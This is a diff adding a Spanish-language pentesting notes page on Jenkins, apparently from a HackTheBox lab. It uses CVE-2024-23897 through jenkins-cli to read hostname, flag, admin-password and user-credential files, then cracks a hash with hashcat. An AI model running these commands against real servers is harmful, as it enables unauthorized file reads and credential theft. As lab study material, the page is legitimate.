@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Jenkins&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Jenkins</p>
+
+<p>El .jar para usar la cli de jenkins está en :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
+</code></pre></div></div>
+
+<p>CVE-2024-23897</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> <span class="s1">'http://10.10.11.10:8080'</span> <span class="nb">help</span> <span class="s1">'@/etc/hostname'</span> a
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> <span class="s1">'http://10.10.11.10:8080'</span> <span class="nb">help</span> <span class="s1">'@/var/jenkins_home/user.txt'</span> a
+</code></pre></div></div>
+
+<p>Jenkins suele guardar la contraseña iniciar en:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/jenkins_home/secrets/initialAdminPassword
+java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> <span class="s1">'http://10.10.11.10:8080'</span> <span class="nb">help</span> <span class="s1">'@/var/jenkins_home/secrets/initialAdminPassword'</span> a
+</code></pre></div></div>
+
+<p>Usuarios en:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/jenkins_home/users/users.xml
+java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> <span class="s1">'http://10.10.11.10:8080'</span> reload-job <span class="s1">'@/var/jenkins_home/users/users.xml'</span>
+</code></pre></div></div>
+
+<p>Y credenciales en :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
+java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> <span class="s1">'http://10.10.11.10:8080'</span> reload-job <span class="s1">'@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 3200 jennifer_hash <span class="nt">--user</span> /usr/share/wordlist/rockyou.txt
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
